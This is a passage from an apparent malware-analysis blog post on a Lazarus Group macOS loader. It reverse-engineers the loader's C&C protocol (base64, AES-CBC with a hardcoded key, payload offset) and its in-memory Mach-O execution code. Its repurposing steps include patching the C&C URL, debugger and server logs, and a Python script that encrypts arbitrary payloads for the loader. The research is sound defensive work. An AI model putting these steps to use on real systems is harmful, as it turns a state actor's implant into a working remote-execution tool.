</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>   print(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (ord(key[i]))),
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>}</span></span></code></pre></div>
<br>
&hellip;which prints out the (expected) <code>key: 26 1d fd b9 70 43 84 f4 f7 37 e0 1c 55 7a ee 74</code></p>
</li>
</ul>
<p>We now understand the parameters passed to the <code>aes_decrypt_cbc</code> function:</p>
<ul>
<li><code>arg 0</code> (<code>0x0</code>): likely the <code>iv</code> (<code>NULL</code>)</li>
<li><code>arg 1</code> (from <code>$r15</code>): pointer to cipher text</li>
<li><code>arg 2</code> (from <code>$rdx</code>): length of cipher text</li>
<li><code>arg 3</code> (from <code>$rcx</code>): key (<code>MD5</code> of the string <code>VMI5EOhq8gDz</code>)</li>
<li><code>arg 4</code> (<code>&amp;var_40</code>): aes &ldquo;context&rdquo;</li>
</ul>
<p>Thus, the malware is (<code>AES</code>) decrypting the received (now base64 decoded) payload, with key = <code>MD5(&quot;VMI5EOhq8gDz&quot;)</code>.</p>
<p>After decrypting the received bytes, the malware initializes a pointer <code>0x90</code> bytes into the received bytes, and a variable with the size of the remaining bytes, before invoking the <code>load_from_memory</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>rbx <span style="color:#f92672">=</span> rbx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x90</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>r14 <span style="color:#f92672">=</span> r14 <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x90</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>rax <span style="color:#f92672">=</span> load_from_memory(rbx, r14, <span style="color:#f92672">&amp;</span>var_C0, rcx, <span style="color:#f92672">&amp;</span>var_40, r9);</span></span></code></pre></div>
<p>Before discussing the parameters passed to this function let&rsquo;s update our custom C&amp;C server to serve up the same data from a file (<code>ABCDEF...</code>), but this time <code>AES</code> encrypted with the hash of <code>&quot;VMI5EOhq8gDz&quot;</code>.
&hellip;we also make sure to skip the first <code>0x90</code> bytes (as the malware skips over these):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;VMI5EOhq8gDz&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>key <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(password)<span style="color:#f92672">.</span>digest()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>iv <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>encryptor <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#66d9ef">with</span> open(in_filename, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> infile:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    <span style="color:#66d9ef">with</span> open(out_filename, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> outfile:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>        
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>        data <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        chunk <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>        data <span style="color:#f92672">+=</span> encryptor<span style="color:#f92672">.</span>encrypt(chunk)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>            chunk <span style="color:#f92672">=</span> infile<span style="color:#f92672">.</span>read(chunksize)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>            <span style="color:#66d9ef">if</span> len(chunk) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>            <span style="color:#66d9ef">elif</span> len(chunk) <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>                chunk <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">16</span> <span style="color:#f92672">-</span> len(chunk) <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>            data <span style="color:#f92672">+=</span> encryptor<span style="color:#f92672">.</span>encrypt(chunk)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>        
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>        outfile<span style="color:#f92672">.</span>write(base64<span style="color:#f92672">.</span>b64encode(data))</span></span></code></pre></div>
<p>Setting a breakpoint on the call to the <code>load_from_memory</code> function (<code>0x0000000100004cb8: call load_from_memory</code>), we can now dump the parameters (and confirm that the encryption in our custom C&amp;C server is correct):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ lldb unioncryptoupdater

(lldb) x/i $pc 
0x100004cb8 <+213>: callq  0x100006dda  ; load_from_memory

//1st arg
(lldb) x/s $rdi
0x101002290: "ABCDEFGHIJKLMNOPQRSTUVWXYZ...

(lldb) reg read $rsi
r14 = 0x0000000000000371

</pre>
</div>
<p>Recalling that the first and second arguments are passed in via the <code>rdi</code> and <code>rsi</code> registers, respectfully, in the above debugger output we can see the malware is passing our now decoded, decrypted &ldquo;payload&rdquo; (<code>ABC...</code>) and size, to the <code>load_from_memory</code> function.</p>
<p>Hooray, this confirms that our detailed analysis has correctly uncovered both the format, encoding, and encryption of the server&rsquo;s expected response.</p>
<p>In summary:</p>
<ul>
<li>encoding: base64</li>
<li>encryption: <code>AES</code> (<code>CBC</code>-mode), with a null-IV, and key of <code>MD5(&quot;VMI5EOhq8gDz&quot;)</code></li>
<li>format: <code>0x400</code>+ bytes, payload starting at offset <code>0x90</code></li>
</ul>
<p>As we now fully understand the format of the malware&rsquo;s protocol, in theory, we should be able remote transmit an encrypted &amp; encoded binary payload and have the malware execute directly from memory!</p>
<p>&hellip;but first a brief discussion of the malware&rsquo;s &ldquo;load and execute from memory&rdquo; code.</p>
<p>In my previous writeup, &ldquo;<a href="blog_0x51.html">Lazarus Group Goes &lsquo;Fileless&rsquo;</a>&rdquo;, I detailed exactly how the malware executed the 2<sup>nd</sup>-stage payload from memory. To (re)summarize:</p>
<ul>
<li>
<p>The <code>load_from_memory</code> function <code>mmaps</code> some memory (with protections: <code>PROT_READ | PROT_WRITE | PROT_EXEC</code>), then copies the decrypted payload into this memory region, before invoking a function named <code>memory_exec2</code>.</p>
</li>
<li>
<p>The <code>memory_exec2</code> function invokes the Apple API <code>NSCreateObjectFileImageFromMemory</code> to create an &ldquo;object file image&rdquo; from a memory buffer (of a <code>mach-O</code> file) then invokes the <code>NSLinkModule</code> function to link the &ldquo;object file image&rdquo;.</p>
</li>
<li>
<p>Once the malware has mapped and linked the downloaded payload, it invokes a function named <code>find_macho</code> which appears to search the memory mapping for <code>MH_MAGIC_64</code> (<code>0xfeedfacf</code>), the 64-bit &ldquo;mach magic number&rdquo; in the <code>mach_header_64</code> structure.</p>
</li>
<li>
<p>Once the <code>find_macho</code> method returns, the malware begins parsing the mapped/linked (<code>mach-O</code>) payload, looking for the address of <code>LC_MAIN</code> load command (<code>0x80000028</code>), which contains information such as the entry point of the in-memory code.</p>
</li>
<li>
<p>The malware then retrieves the offset of the entry point (found at offset <code>0x8</code> within the <code>LC_MAIN</code> load command), sets up some arguments, then jumps to this address, to kick off the execution of the payloads binary code.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">//rcx points to the `LC_MAIN` load command
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#75715e"></span>r8 <span style="color:#f92672">=</span> r8 <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>(rcx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#75715e">//invoke payload&#39;s entry point!
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span><span style="color:#75715e"></span>rax <span style="color:#f92672">=</span> (r8)(<span style="color:#ae81ff">0x2</span>, <span style="color:#f92672">&amp;</span>var_40, <span style="color:#f92672">&amp;</span>var_48, <span style="color:#f92672">&amp;</span>var_50, r8);</span></span></code></pre></div>
<p>Skimming over the disassembly of the <code>memory_exec2</code> reveals some interesting code snippets, such as the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">//RDI points to the mach-O header (of the payload)
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#75715e">// offset 0xC in a mach-O header is file type (`uint32_t filetype`)
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#75715e"></span>rbx <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)(rdi <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span><span style="color:#66d9ef">if</span> (rbx <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x8</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>            <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)(rdi <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>}</span></span></code></pre></div>
<p>Stepping thru this code in a debugger, reveals it is checking the type of the (<code>mach-O</code>) binary payload (<code>MH_EXECUTE</code>, <code>MH_BUNDLE</code>, etc). If the <code>mach-O</code> file type is not <code>MH_BUNDLE</code> (<code>0x8</code>), it updates the (in-memory) type to be this value: <code>*(rdi + 0xc) = 0x8</code>.</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
Process 2866 stopped
* stop reason = breakpoint 1.1

unioncryptoupdater`memory_exec2:
->  0x1000069c0 <+33>: cmpl   $0x8, %ebx     ;0x8: MH_BUNDLE
    0x1000069c3 <+36>: je     0x1000069cc
    0x1000069c5 <+38>: movl   $0x8, 0xc(%rdi)
    0x1000069cc <+45>: leaq   -0x58(%rbp), %rdx

(lldb) reg read $rbx
       rbx = 0x0000000000000002  ;0x2: MH_EXECUTE
</pre>
</div>
<p>This is done, (as <a href="https://threatvector.cylance.com/en_us/home/running-executables-on-macos-from-memory.html">online research</a> notes) as the <code>man</code> page for <code>NSModule</code> state: <em>&ldquo;Currently the implementation is limited to only Mach-O MH_BUNDLE types which are used for plugins.&rdquo;</em> Thus in order to play nicely with the Apple APIs and thus support the in-memory execution of &lsquo;standard&rsquo; <code>mach-O</code> executables (type: <code>MH_EXECUTE</code>), this &lsquo;patch&rsquo; must be applied.</p>
<p>However, the most interesting thing about this snippet of code found within the malware, is that it&rsquo;s not original&hellip;</p>
<p>In 2017, Cylance published a blog post titled: &ldquo;<a href="https://threatvector.cylance.com/en_us/home/running-executables-on-macos-from-memory.html">Running Executables on macOS From Memory</a>&rdquo;. Though the topic of in-memory code execution on macOS had been covered before (as was noted in the blog post), the post provided a comprehensive technical deep-dive into the topic, and more importantly provided an open-source project which included code to perform in-memory loading: &ldquo;<a href="https://github.com/CylanceVulnResearch/osx_runbin">osx_runbin</a>&rdquo;.</p>
<p>The researcher (Stephanie Archibald), also presented this research (and more!) at an Infiltrate talk:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Here we are learning modernized osx rootkits (userland) from Stephanie Archibald ! <a href="https://t.co/rAsK4xqSBh">pic.twitter.com/rAsK4xqSBh</a></p>&mdash; Dave Aitel (@daveaitel) <a href="https://twitter.com/daveaitel/status/850039542698708992?ref_src=twsrc%5Etfw">April 6, 2017</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>If we compare Cylance&rsquo;s <a href="https://github.com/CylanceVulnResearch/osx_runbin">osx_runbin</a> code, it is trivial to see the in-memory loader code found within the Lazarus&rsquo;s group&rsquo;s malware is nearly 100% the same:</p>
<img src="../images/blog/blog_0x54/compare.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>&hellip;in other words, the Lazarus group coders simply leveraged (copied/stole) the existing open-source <code>osx_runbin</code> code in order to give their loader, advanced stealth and anti-forensics capabilities. And who can blame them? Work smart, not hard, right!? 😅</p>
<div class="note">
<p>This is not the first time, I&rsquo;ve stumbled across &ldquo;shared&rdquo; code in macOS APT group malware specimens.</p>
<p>See: &ldquo;<a href="https://objective-see.com/blog/blog_0x18.html">From Italy With Love? Finding HackingTeam code in Russian Malware</a>&rdquo;</p>
</div>
<p>Ok, so let&rsquo;s start to wrap this all up, and (finally!) illustrate the full repurposing of the Lazarus group&rsquo;s loader, so that it beacons to <strong>our</strong> C&amp;C server to download and execute (from memory), <strong>our</strong> 2<sup>nd</sup>-stage payloads!</p>
<p>Step one is to modify the loader so that it beacons to our C&amp;C server for tasking.</p>
<p>Looking in the disassembler, we find the hardcoded address of the malware C&amp;C server: <code>https://unioncrypto.vip/update</code>:</p>
<img src="../images/blog/blog_0x54/hardcoded.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Popping into a hexeditor, we can modify this to whatever URL or IP address we&rsquo;d like the malware to now connect to (i.e. to from <code>https://unioncrypto.vip/update</code> to <code>https://allyourbase.belong/</code>):</p>
<img src="../images/blog/blog_0x54/patched.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>One the malware checks in:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# python server.py

  [+] awaiting connections
  [+] new connection from 192.168.0.2

  ======= POST HEADERS =======
  Host: allyourbase.belong
  Accept: */*
  auth_signature: ca57054ea39f84a6f5ba0c65539a0762
  auth_timestamp: 1581048662
  Content-Length: 62
  Content-Type: application/x-www-form-urlencoded

  ======= POST BODY =======
  MiniFieldStorage('act', 'check')
  MiniFieldStorage('ei', 'Mac OS X 10.15 (19A603)')
  MiniFieldStorage('rlz', 'VMI5EOhq8gDz')
  MiniFieldStorage('ver', '1.0')
  [06/Feb/2020 20:11:08] "POST /update HTTP/1.1" 200 -

</pre>
</div>
<p>&hellip;we should be able to serve up our 2<sup>nd</sup>-stage payloads!</p>
<p>Step two is to prepare and package up these payloads. This involves encrypting (<code>AES</code>, key: <code>MD5(&quot;VMI5EOhq8gDz&quot;)</code>) any <code>mach-O</code> binary and placing that at offset <code>0x90</code> within the server&rsquo;s base64-encoded response.</p>
<p>During our analysis phase, we had (already) put together some basic python code, to implement this logic:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>import os, random, <span style="color:#66d9ef">struct</span>, hashlib, base64
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>from Crypto.Cipher import AES
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>password <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>VMI5EOhq8gDz<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>key <span style="color:#f92672">=</span> hashlib.md5(password).digest()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>def encryptFile(key, in_filename, out_filename<span style="color:#f92672">=</span>None, chunksize<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1024</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    iv <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">&#39;\x00&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    encryptor <span style="color:#f92672">=</span> AES.new(key, AES.MODE_CBC, iv)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>     
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    with open(in_filename, <span style="color:#960050;background-color:#1e0010">&#39;</span>rb<span style="color:#960050;background-color:#1e0010">&#39;</span>) as infile:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>        with open(out_filename, <span style="color:#960050;background-color:#1e0010">&#39;</span>wb<span style="color:#960050;background-color:#1e0010">&#39;</span>) as outfile:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>            
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>            data <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">&#39;\x00&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>            chunk <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">&#39;\x00&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>            data <span style="color:#f92672">+=</span> encryptor.encrypt(chunk)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>            <span style="color:#66d9ef">while</span> True:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>                chunk <span style="color:#f92672">=</span> infile.read(chunksize)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>                <span style="color:#66d9ef">if</span> len(chunk) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>                elif len(chunk) <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>                    chunk <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">16</span> <span style="color:#f92672">-</span> len(chunk) <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>                data <span style="color:#f92672">+=</span> encryptor.encrypt(chunk)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>            
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>            outfile.write(base64.b64encode(data))
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>encryptFile(key, <span style="color:#960050;background-color:#1e0010">&#39;</span>payloadBEFORE<span style="color:#960050;background-color:#1e0010">&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span>payloadAFTER<span style="color:#960050;background-color:#1e0010">&#39;</span>)</span></span></code></pre></div>
<p>Now we just need a test payload &hellip;a standard <code>&quot;Hello World&quot;</code> binary should suffice:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">#import &lt;Foundation/Foundation.h&gt;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> argv[]) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    <span style="color:#66d9ef">@autoreleasepool</span> {
